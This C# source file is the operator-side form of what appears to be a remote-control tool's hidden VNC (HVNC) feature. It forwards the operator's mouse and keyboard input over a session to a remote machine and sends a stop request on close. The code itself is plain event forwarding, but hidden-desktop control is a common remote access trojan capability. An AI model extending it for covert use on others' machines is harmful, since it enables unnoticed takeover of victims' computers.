using System.Windows.Forms;
using RemoteControl.Protocals;

namespace RemoteControl.Server
{
    public partial class FrmHVNC
    {
        #region Mouse events

        private void pictureBox1_MouseDown(object sender, MouseEventArgs e)
        {
            if (_isCaptureMouse)
            {
                RequestMouseEvent req = new RequestMouseEvent();
                req.MouseButton = (eMouseButtons)e.Button;
                req.MouseOperation = eMouseOperations.MouseDown;
                req.MouseLocation = e.Location;
                oSession.Send(ePacketType.PACKET_HVNC_MOUSE_EVENT_REQUEST, req);
            }
        }

        private void pictureBox1_MouseUp(object sender, MouseEventArgs e)
        {
            if (_isCaptureMouse)
            {
                RequestMouseEvent req = new RequestMouseEvent();
                req.MouseButton = (eMouseButtons)e.Button;
                req.MouseOperation = eMouseOperations.MouseUp;
                req.MouseLocation = e.Location;
                oSession.Send(ePacketType.PACKET_HVNC_MOUSE_EVENT_REQUEST, req);
            }
        }

        private void pictureBox1_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            if (_isCaptureMouse)
            {
                RequestMouseEvent req = new RequestMouseEvent();
                req.MouseButton = (eMouseButtons)e.Button;
                req.MouseOperation = eMouseOperations.MouseDoubleClick;
                req.MouseLocation = e.Location;
                oSession.Send(ePacketType.PACKET_HVNC_MOUSE_EVENT_REQUEST, req);
            }
        }

        private void pictureBox1_MouseMove(object sender, MouseEventArgs e)
        {
            if (_isCaptureMouse && e.Button != MouseButtons.None)
            {
                RequestMouseEvent req = new RequestMouseEvent();
                req.MouseButton = (eMouseButtons)e.Button;
                req.MouseOperation = eMouseOperations.MouseMove;
                req.MouseLocation = e.Location;
                oSession.Send(ePacketType.PACKET_HVNC_MOUSE_EVENT_REQUEST, req);
            }
        }

        private void pictureBox1_MouseWheel(object sender, MouseEventArgs e)
        {
            if (_isCaptureMouse)
            {
                RequestMouseEvent req = new RequestMouseEvent();
                req.MouseButton = eMouseButtons.None;
                req.MouseOperation = eMouseOperations.MouseScroll;
                req.MouseLocation = e.Location;
                req.ScrollDelta = e.Delta;
                oSession.Send(ePacketType.PACKET_HVNC_MOUSE_EVENT_REQUEST, req);
            }
        }

        #endregion

        #region Keyboard events

        private void FrmHVNC_KeyDown(object sender, KeyEventArgs e)
        {
            if (_isCaptureKeyboard)
            {
                RequestKeyboardEvent req = new RequestKeyboardEvent();
                req.KeyOperation = eKeyboardOpe.KeyDown;
                req.KeyCode = (eKeyboardKeys)e.KeyCode;
                req.KeyValue = e.KeyValue;
                req.KeyData = (eKeyboardKeys)e.KeyData;
                oSession.Send(ePacketType.PACKET_HVNC_KEYBOARD_EVENT_REQUEST, req);
            }
        }

        private void FrmHVNC_KeyUp(object sender, KeyEventArgs e)
        {
            if (_isCaptureKeyboard)
            {
                RequestKeyboardEvent req = new RequestKeyboardEvent();
                req.KeyOperation = eKeyboardOpe.KeyUp;
                req.KeyCode = (eKeyboardKeys)e.KeyCode;
                req.KeyValue = e.KeyValue;
                req.KeyData = (eKeyboardKeys)e.KeyData;
                oSession.Send(ePacketType.PACKET_HVNC_KEYBOARD_EVENT_REQUEST, req);
            }
        }

        #endregion

        #region Form closing

        private void FrmHVNC_FormClosing(object sender, FormClosingEventArgs e)
        {
            oSession.Send(ePacketType.PACKET_HVNC_STOP_REQUEST, null);
        }

        #endregion
    }
}
